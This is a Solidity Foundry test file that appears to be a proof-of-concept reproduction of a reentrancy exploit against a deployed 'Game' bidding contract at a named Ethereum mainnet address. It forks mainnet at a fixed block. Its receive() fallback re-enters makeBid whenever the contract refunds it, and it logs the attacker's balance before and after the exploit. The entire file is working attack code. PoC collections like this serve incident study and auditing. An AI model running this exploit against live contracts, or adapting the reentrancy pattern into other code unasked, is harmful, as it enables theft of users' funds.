// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/interface.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IGame {
    function newBidEtherMin() external view returns (uint256);
    function makeBid() external payable;
    function bidEther() external view returns (uint256);
}

contract GameTokenTest is Test {
    // Environment Configuration
    uint256 constant forkBlock = 19_213_946;
    address constant fundToken = address(0);

    // Variable
    address internal Game = 0x52d69c67536f55EfEfe02941868e5e762538dBD6;
    uint256 internal lastBid = 0;

    /// Modifier
    modifier BalanceLog() {
        console.log("Attacker Token Balance Before Exploit: ", getBalance(fundToken));
        _;
        console.log("Attacker Token Balance After Exploit: ", getBalance(fundToken));
    }

    // Balance Log
    function getBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return address(this).balance;
        return IERC20(token).balanceOf(address(this));
    }

    // Environment Setup
    function setUp() public {
        vm.createSelectFork("mainnet", forkBlock);
        vm.deal(address(this), 0.6 ether);

        vm.label(address(Game), "Game");
    }

    // Exploit Procedure
    function testExploit() public BalanceLog {
        uint256 bidAmount = address(this).balance / 2;
        IGame(Game).makeBid{value: bidAmount}();
        exploit();
    }

    function exploit() public {
        uint256 minBidAmount = IGame(Game).newBidEtherMin();
        IGame(Game).makeBid{value: minBidAmount + 1}();
    }

    receive() external payable {
        uint256 minBidAmount = IGame(Game).newBidEtherMin();
        if (address(this).balance > minBidAmount + 1 && Game.balance > IGame(Game).bidEther()) {
            lastBid = minBidAmount + 1;
            exploit();
        }
    }
}
